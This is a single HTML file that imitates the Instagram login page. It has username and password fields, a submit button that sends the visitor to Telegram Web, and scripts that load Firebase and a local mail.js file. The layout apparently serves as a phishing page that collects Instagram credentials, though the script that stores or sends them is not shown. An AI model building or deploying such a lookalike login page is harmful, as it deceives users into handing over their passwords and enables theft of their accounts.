<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="assets/css/main.css">
  <title>Instagram</title>
</head>
<body>
  <main class="l-main">
<!--       <div class="l-main__img">
        <img src="assets/img/homepage.png" alt="Smartphones">
      </div> -->
      <div class="l-user">
        <div class="c-panel group">
          <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
          <!-- <div class="alert">Your message sent</div> -->
          <div class="c-panel__form">
            <form action="" id="contact">
            <input type="text" class="c-panel__input" id="usr" placeholder="Phone number or username">
            <input type="text" class="c-panel__input", id="psswd" placeholder="Password"> <br>
            <div class="submitbtn">
              <button type="submit" onclick="location.href= 'https://web.telegram.org/a/';"; style="color: white; background-color: #0095f6; border: none; margin: 5% 10%; padding: 3% 18%; border-radius: 4px;">Submit</button>
            </div>
            
          </form>
            <span class="c-panel__span">OR</span>
          </div>
          <a href="#" class="c-panel__facebook">Login with Facebook</a>
          <a href="#" class="c-panel__forgot">Forgot password?</a>
        </div>
        <div class="c-signup group">
          <p>Don't have an account? <span>Sign up</span></p>
        </div>
        <div class="c-app">
          <p>Get the app.</p>
          <div class="c-app__download">
            <img src="assets/img/apple.png" alt="Apple Store">
            <img src="assets/img/google.png" alt="Google Play">
          </div>
        </div>
      </div>
  </main>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
  <script src="./assets/js/mail.js"></script>
</body>
</html>
